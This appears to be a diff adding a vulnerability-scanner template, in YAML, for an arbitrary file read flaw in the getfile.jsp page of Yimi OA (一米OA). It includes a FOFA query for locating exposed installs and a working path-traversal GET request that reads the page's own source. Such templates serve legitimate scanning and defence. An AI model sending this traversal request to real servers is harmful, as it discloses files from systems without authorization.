@@ -1,0 +1,19 @@
+id: yimi-oa-getfile-fileread
+
+info:
+  name: 一米OA getfile.jsp 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  description: |
+    一米OA getfile.jsp文件过滤不足，导致任意文件读取漏洞
+    fofa: app="一米OA"
+  tags: yimi,oa,getfile,fileread
+  created: 2025/03/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp
+    expression: response.status == 200 && response.body.bcontains(b'"com.redmoon.oa.pvg.Privilege"')
+expression: r0()
